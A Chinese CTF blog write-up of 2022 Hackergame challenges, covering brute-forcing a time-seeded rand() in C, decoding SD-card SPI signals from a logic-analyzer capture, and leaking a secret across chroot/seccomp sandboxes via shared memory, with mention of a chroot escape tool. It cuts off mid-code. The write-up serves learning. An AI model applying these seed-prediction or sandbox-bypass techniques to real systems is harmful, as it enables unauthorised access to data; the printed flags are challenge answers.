<p>因此可以先开始爆破这个随机数种子，从当前时刻开始，然后再开题目。毕竟题目那边 srand 这里 <code>time(0) + clock()</code> 肯定比你爆破的初始值要大了。</p>
<p>自己写个 <strong>exp:</strong></p>
<p>这里为了快速爆破，只生成前两个蒙特卡罗估计结果，注意初始值 <code>init</code> 不要加那个 <code>clock</code> 了 </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token keyword">double</span> <span class="token function">rand01</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> RAND_MAX<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">// disable buffering</span>
	<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span> init <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> offset <span class="token operator">&lt;=</span> <span class="token number">100000</span><span class="token punctuation">;</span> offset<span class="token operator">++</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">srand</span><span class="token punctuation">(</span>init <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// srand(1666738405);</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: "</span><span class="token punctuation">,</span> init <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> games <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">//5</span>
		<span class="token keyword">int</span> win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> lose <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">char</span> target<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">char</span> guess<span class="token punctuation">[</span><span class="token number">2000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> games<span class="token punctuation">;</span> i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">int</span> M <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
			<span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">400000</span><span class="token punctuation">;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token function">rand01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">double</span> y <span class="token operator">=</span> <span class="token function">rand01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token operator">*</span>x <span class="token operator">+</span> y<span class="token operator">*</span>y <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> M<span class="token operator">++</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">double</span> pi <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>M <span class="token operator">/</span> N <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%1.5f, "</span><span class="token punctuation">,</span> pi<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>反正这个初始值就当前 unix timestamp，offset 开大点就好，这里得用主办方给的 Dockerfile 自己搭一个</p>
<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> debian:11</span>
<span class="token instruction"><span class="token keyword">RUN</span> apt update &amp;&amp; apt -y upgrade &amp;&amp; <span class="token operator">\</span>
    apt install -y gcc &amp;&amp; rm -rf /var/lib/apt/lists/*</span>
<span class="token instruction"><span class="token keyword">COPY</span> monte_carlo.c /</span>
<span class="token instruction"><span class="token keyword">RUN</span> gcc -O3 /monte_carlo.c -o /a.out</span>
<span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"/a.out"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最开始，咱先写了个 pwntools 脚本去交互，subprocess 调用 docker 去爆破，判断第一个数，之后又判断前两个数，写的乱的要死还爆破不出来</p>
<p>差点要放弃了（天亮了）</p>
<p>最后想为啥不反过来，直接手动找就好了啊。爆破一直开，然后开题目在终端上随便填，拿前两个数据，然后去比对</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build -t monte_carlo <span class="token builtin class-name">.</span>
<span class="token function">docker</span> run --rm monte_carlo <span class="token operator">&gt;</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>左边开个 docker 跑爆破，右边 grep 跑出来的结果</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221026065045948.png"></p>
<p>在跑了好一会儿之后，终于看到了需要的数据，呜呜呜！！！（实际上喵喵改了老半天代码重新 build 跑了好多次</p>
<p>然后再改改代码，把 <code>srand(1666738405);</code> 这里设置成这个确定的随机数种子，<code>int games = 5;</code> 改回去，再 build 个 docker 把对应结果跑出来</p>
<p>（其实可以加个 argv 做特判的，咱懒得写了，心态炸了</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221026064824690.png"></p>
<p><code>flag{raNd0m_nUmb34_a1wayS_m4tters_7a5614bb46}</code></p>
<h2 id="片上系统"><a href="#片上系统" class="headerlink" title="片上系统"></a>片上系统</h2><blockquote>
<p>你的室友在学习了计算机组成原理之后沉迷 RISC-V 软核开发。</p>
<p>RISC-V，是一个近年来兴起的开放指令集架构。</p>
<p>软核，意思是这个 RISC-V CPU（如果能称之为 CPU 的话）是在 FPGA  等可编程芯片中运行的（而不是在真正硅片上固定的物理电路）。同时，CPU 需要的外部硬件，如字符打印、图像显示、LED  点灯等等，均需要自己用硬件描述语言编写（而不像单片机等设备开发时只要调用库函数就可以了）。有些人会选择已经实现好的开源部件和处理器，组合定制成为一套片上系统（System on Chip, SoC），用于嵌入式开发、工业控制或个人娱乐等目的。而另外一些失去理智的人们则选择以一己之力，从零开始编写自己的 CPU  和外设，并企图用自己几个月摸鱼摸出的处理器与嵌入式大厂数十年的积累抗衡，尽管 Ta 们的 CPU 通常性能不如  i386、没有异常处理、甚至几十个周期才能完成一条指令，而外设也通常仅限于串口和几个屈指可数的 LED 灯。</p>
<p>最近，你听说室友在 SD 卡方面取得了些进展。在他日复一日的自言自语中，你逐渐了解到这个由他一个人自主研发的片上系统现在已经可以从 SD  卡启动：先由“片上 ROM 中的固件”加载并运行 SD 卡第一个扇区中的“引导程序”，之后由这个“引导程序”从 SD  卡中加载“操作系统”。而这个“操作系统”目前能做的只是向“串口”输出一些字符。</p>
<p>同时你听说，这个并不完善的 SD 卡驱动只使用了 SD 卡的 SPI 模式，而传输速度也是低得感人。此时你突然想到：如果速度不快的话，是不是可以用逻辑分析仪来采集（偷窃）这个 SD 卡的信号，从而“获得” SD 卡以至于这个“操作系统”的秘密？</p>
<p>你从抽屉角落掏出吃灰已久的逻辑分析仪。这个小东西价格不到 50 块钱，采样率也只有 24 M。你打开  PulseView，把采样率调高，连上室友开发板上 SD  卡的引脚，然后接通了开发板的电源，希望这聊胜于无的分析仪真的能抓到点什么有意思的信号。至于你为什么没有直接把 SD  卡拿下来读取数据，就没人知道了。</p>
<p><strong>引导扇区</strong></p>
<p>听说，第一个 flag 藏在 SD 卡第一个扇区的末尾。你能找到它吗？</p>
<p><strong>操作系统</strong></p>
<p>室友的“操作系统”会输出一些调试信息和第二个 flag。从室友前些日子社交网络发布的终端截图看，这个“操作系统”每次“启动”都会首先输出：</p>
<pre class="line-numbers language-none"><code class="language-none">LED: ON
Memory: OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>或许你可以根据这一部分固定的输出和引导扇区的代码，先搞清楚那“串口”和“SD 卡驱动”到底是怎么工作的，之后再仔细研究 flag 到底是什么，就像当年的 Enigma 一样。</p>
</blockquote>
<h3 id="引导扇区"><a href="#引导扇区" class="headerlink" title="引导扇区"></a>引导扇区</h3><p>给了个 PulseView 的逻分抓包文件</p>
<p>哈哈，之前喵喵就出过的一道 UART 逻分抓包的题，这次是 SPI 了</p>
<p>SD 卡，SPI 模式，传输速度低得感人，第一个 flag 藏在 SD 卡第一个扇区的末尾</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025230020609.png"></p>
<p>很明显 D1 是时钟 CLK，D0 应该是片选 CS，D2 应该是主机给 SD 卡发（？），D3 应该是 SD 卡给主机发数据</p>
<p>这里分隔开的一个一个区间应该就是对应了不同的扇区了，要取的数据应该就在这一块</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025231131289.png"></p>
<p>选个 SPI，稍微配置一下，顺便可以加上个 Stack Decoder </p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025231223940.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025230958420.png"></p>
<p>用光标选一下，把这里的数据导出来 Export annotations for this row within cursor range</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025231504215.png"></p>
<pre class="line-numbers language-none"><code class="language-none">200474-200736 SPI: MOSI data: 66
200752-201015 SPI: MOSI data: 6C
201031-201293 SPI: MOSI data: 61
201309-201572 SPI: MOSI data: 67
201588-201850 SPI: MOSI data: 7B
201866-202129 SPI: MOSI data: 30
202145-202407 SPI: MOSI data: 4B
202423-202686 SPI: MOSI data: 5F
202702-202963 SPI: MOSI data: 79
202980-203243 SPI: MOSI data: 6F
203259-203520 SPI: MOSI data: 75
203537-203800 SPI: MOSI data: 5F
203816-204077 SPI: MOSI data: 67
204095-204357 SPI: MOSI data: 6F
204373-204634 SPI: MOSI data: 54
204652-204914 SPI: MOSI data: 5F
204930-205193 SPI: MOSI data: 74
205209-205471 SPI: MOSI data: 68
205487-205750 SPI: MOSI data: 33
205766-206028 SPI: MOSI data: 5F
206044-206307 SPI: MOSI data: 62
206323-206585 SPI: MOSI data: 34
206601-206864 SPI: MOSI data: 73
206880-207141 SPI: MOSI data: 49
207158-207421 SPI: MOSI data: 63
207437-207698 SPI: MOSI data: 5F
207716-207978 SPI: MOSI data: 31
207994-208255 SPI: MOSI data: 64
208273-208535 SPI: MOSI data: 45
208551-208814 SPI: MOSI data: 34
208830-209092 SPI: MOSI data: 5F
209108-209371 SPI: MOSI data: 63
209387-209649 SPI: MOSI data: 61
209665-209928 SPI: MOSI data: 52
209944-210206 SPI: MOSI data: 52
210222-210485 SPI: MOSI data: 79
210501-210763 SPI: MOSI data: 5F
210779-211042 SPI: MOSI data: 30
211058-211319 SPI: MOSI data: 4E
211336-211599 SPI: MOSI data: 7D
211615-211876 SPI: MOSI data: B0
211894-212156 SPI: MOSI data: E5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025231550430.png"></p>
<p><code>flag{0K_you_goT_th3_b4sIc_1dE4_caRRy_0N}</code></p>
<h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p>干脆把所有 D3 通道输出的数据都导出来，大概长这样</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025232239085.png"></p>
<p>也看到了操作系统启动输出的 <code>LED: ON Memory: OK</code></p>
<p><del>唉，这么说来 D3 应该是串口输出才对吧（？</del> 应该是段固件</p>
<p>翻了下时序图</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025233635647.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025233640988.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025233703682.png"></p>
<p>wikipedia: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Enigma_machine">Enigma machine</a></p>
<blockquote>
<p>The <strong>Enigma machine</strong> is a cipher device developed and used in the early- to mid-20th century to protect commercial, diplomatic, and military communication. It was employed extensively by Nazi Germany during World War II, in all branches of the German military. The Enigma machine was considered so secure that it was used to encipher the most top-secret messages.</p>
<p>The Enigma has an electromechanical rotor mechanism that scrambles the 26 letters of the alphabet. In typical use, one person enters text on the Enigma’s keyboard and another person writes down which of the 26 lights above the keyboard illuminated at each key press. If plain text is entered, the illuminated letters are the ciphertext. Entering ciphertext transforms it back into readable plaintext. The rotor mechanism changes the electrical connections between the keys and the lights with each keypress. </p>
</blockquote>
<p>嗯，是个硬件电路实现的密码装置，感觉好多密码学的东西都是在战争中诞生的啊（但好像对解题没啥用就是了</p>
<p>先把这个输出的东西丢到 IDA 里分析（所以那些可见字符只是二进制程序里的字符串部分？</p>
<p>呜呜，不会 RISC-V 啊</p>
<p>TODO</p>
<h2 id="看不见的彼方"><a href="#看不见的彼方" class="headerlink" title="看不见的彼方"></a>看不见的彼方</h2><blockquote>
<p>虽然看见的是同一片天空（指运行在同一个 kernel 上），脚踏着的是同一块土地（指使用同一个用户执行），他们之间却再也无法见到彼此——因为那名为 <code>chroot(2)</code> 的牢笼，他们再也无法相见。为了不让他们私下串通，魔王甚至用 <code>seccomp(2)</code>，把他们调用与 socket 相关的和调试相关的系统调用的权利也剥夺了去。</p>
<p>但即使无法看到对方所在的彼方，他们相信，他们的心意仍然是相通的。即使心处 <code>chroot(2)</code> 的牢笼，身缚 <code>seccomp(2)</code> 的锁链，他们仍然可以将自己想表达的话传达给对方。</p>
<hr>
<p>你需要上传两个 x86_64 架构的 Linux 程序。为了方便描述，我们称之为 Alice 和 Bob。两个程序会在独立的 chroot 环境中运行。</p>
<p>在 Alice 的环境中，secret 存储在 <code>/secret</code> 中，可以直接读取，但是 Alice 的标准输出和标准错误会被直接丢弃；在 Bob 的环境中，没有 flag，但是 Bob 的标准输出和标准错误会被返回到网页中。<code>/secret</code> 的内容每次运行都会随机生成，仅当 Bob 的标准输出输出与 Alice 的 <code>/secret</code> 内容相同的情况下，你才能够获得 flag。</p>
<p>执行环境为 Debian 11，两个程序文件合计大小需要在 10M 以下，最长允许运行十秒。特别地，如果你看到 “Failed to  execute program.”  或其他类似错误，那么说明你的程序需要的运行时库可能在环境中不存在，你需要想办法在满足大小限制的前提下让你的程序能够顺利运行。</p>
<p><a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/30b4b248-eff5-5ec0-b5a7-310ca91550f3/kanata.zip">构建环境相关的 Dockerfile 附件</a></p>
</blockquote>
<p>在现代 Linux 上，chroot 既是一个 CLI 工具（<code>chroot(8)</code>），又是一个系统调用（<code>chroot(2)</code>）。</p>
<p>这里给了源码，然而里面是调用的 chroot 命令啊（</p>
<p>试了下 <a target="_blank" rel="noopener" href="https://github.com/earthquake/chw00t/">chw00t</a> 里的各种方法</p>
<blockquote>
<p><strong>chw00t: chroot escape tool</strong></p>
<p>This tool can help you escape from chroot environments.  Even though chroot is not a security feature in any Unix systems, it is  misused in a lot of setups. With this tool there is a chance that you  can bypass this barrier.</p>
</blockquote>
<p><code>mkdir</code> 失败。。</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221028062728367.png"></p>
<p>发现试了老半天都穿不出去……</p>
<p>然后执行器 <code>executor.c</code> 里把 socket 之类的 syscall 给禁用了，于是网络相关的也不行</p>
<p>那还有啥？<strong>共享内存！</strong></p>
<p>咱俩共享一块内存空间，然后通过这块内存进行交互就完事了喵！！！</p>
<p>参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/52php/p/5861372.html">Linux进程间通信（六）：共享内存 shmget()、shmat()、shmdt()、shmctl()</a></p>
<p>直接拿他的代码改一改，发现这里好像有个执行时间的限制，反正 sleep 不能超过2s，超过直接返回空了</p>
<p><strong>Alice:</strong></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/shm.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">_SHMDATA_H_HEADER</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_SHMDATA_H_HEADER</span></span>
 
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TEXT_SZ</span> <span class="token expression"><span class="token number">2048</span></span></span>
 
<span class="token keyword">struct</span> <span class="token class-name">shared_use_st</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> written<span class="token punctuation">;</span> <span class="token comment">// 作为一个标志，非0：表示可读，0：表示可写</span>
    <span class="token keyword">char</span> text<span class="token punctuation">[</span>TEXT_SZ<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录写入 和 读取 的文本</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
 
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

 
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>shm <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">shared_use_st</span> <span class="token operator">*</span>shared <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUFSIZ <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 用于保存输入的文本</span>
    <span class="token keyword">int</span> shmid<span class="token punctuation">;</span>

    FILE <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/secret"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// fscanf(fp, "%s", buffer);</span>

 
    <span class="token comment">// 创建共享内存</span>
    shmid <span class="token operator">=</span> <span class="token function">shmget</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">key_t</span><span class="token punctuation">)</span><span class="token number">1234</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">shared_use_st</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token operator">|</span>IPC_CREAT<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>shmid <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"shmget failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token comment">// 将共享内存连接到当前的进程地址空间</span>
    shm <span class="token operator">=</span> <span class="token function">shmat</span><span class="token punctuation">(</span>shmid<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>shm <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"shmat failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Memory attched at %X\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>shm<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token comment">// 设置共享内存</span>
    shared <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">shared_use_st</span> <span class="token operator">*</span><span class="token punctuation">)</span>shm<span class="token punctuation">;</span>
    <span class="token comment">// while (1) // 向共享内存中写数据</span>
    <span class="token punctuation">{</span>
        <span class="token comment">// 数据还没有被读取，则等待数据被读取，不能向共享内存中写入文本</span>
        <span class="token comment">// while (shared-&gt;written == 1)</span>
        <span class="token comment">// {</span>
        <span class="token comment">//     sleep(1);</span>
        <span class="token comment">//     printf("Waiting...\n");</span>
        <span class="token comment">// }</span>
 
        <span class="token comment">// 向共享内存中写入数据</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter some text: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// fgets(buffer, BUFSIZ, stdin);</span>
        <span class="token comment">// strcpy(buffer, "miaohomoend");</span>
	    <span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">strncpy</span><span class="token punctuation">(</span>shared<span class="token operator">-&gt;</span>text<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> TEXT_SZ<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
        <span class="token comment">// 写完数据，设置written使共享内存段可读</span>
        shared<span class="token operator">-&gt;</span>written <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
 
        <span class="token comment">// 输入了end，退出循环（程序）</span>
        <span class="token comment">// if (strncmp(buffer, "end", 3) == 0)</span>
        <span class="token comment">// {</span>
        <span class="token comment">//     break;</span>
        <span class="token comment">// }</span>
    <span class="token punctuation">}</span>
 
    <span class="token comment">// 把共享内存从当前进程中分离</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">shmdt</span><span class="token punctuation">(</span>shm<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"shmdt failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>Bob:</strong></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/shm.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">_SHMDATA_H_HEADER</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_SHMDATA_H_HEADER</span></span>
 
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TEXT_SZ</span> <span class="token expression"><span class="token number">2048</span></span></span>
 
<span class="token keyword">struct</span> <span class="token class-name">shared_use_st</span>
<span class="token punctuation">{</span>
